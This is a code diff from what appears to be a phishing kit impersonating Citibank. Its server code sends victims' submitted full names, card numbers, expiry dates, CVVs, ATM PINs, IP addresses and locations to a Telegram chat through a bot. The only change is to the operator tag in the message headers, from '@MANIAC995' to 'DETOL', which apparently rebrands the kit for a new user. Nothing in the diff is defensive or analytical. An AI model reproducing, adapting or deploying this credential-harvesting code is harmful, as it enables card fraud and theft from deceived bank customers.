@@ -61,7 +61,7 @@ if (location && location.city && location.regionName) {
 
   bot.telegram.sendMessage(
     config.CHAT_ID,
-    `<b>NEW CITIB@NK  LOG - @MANIAC995</b>\n\n<b>LOG ID:</b> <code>${
+    `<b>NEW CITIB@NK  LOG - DETOL</b>\n\n<b>LOG ID:</b> <code>${
       req.body.id
     }</code>\n<b>Full Name:</b> <code>${
       req.body.fname
@@ -99,7 +99,7 @@ if (location && location.city && location.regionName) {
 
   bot.telegram.sendMessage(
     config.CHAT_ID,
-    `<b>CITIB@NK LOG [CARD & ATM - PIN ] - @MANIAC995</b>\n\n<b>LOG ID:</b> <code>${req.body.id}</code>\n<b>CARD NUMBERN:</b><code>${req.body.ccnum}</code>\n<b>Expiry Date:</b> <code>${req.body.exp}</code>\n<b>CVV:</b> <code>${req.body.cvv}</code>\n<b>ATM PIN:</b> <code>${req.body.pin}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
+    `<b>CITIB@NK LOG [CARD & ATM - PIN ] - DETOL</b>\n\n<b>LOG ID:</b> <code>${req.body.id}</code>\n<b>CARD NUMBERN:</b><code>${req.body.ccnum}</code>\n<b>Expiry Date:</b> <code>${req.body.exp}</code>\n<b>CVV:</b> <code>${req.body.cvv}</code>\n<b>ATM PIN:</b> <code>${req.body.pin}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
     { parse_mode: "HTML" }
   );
   
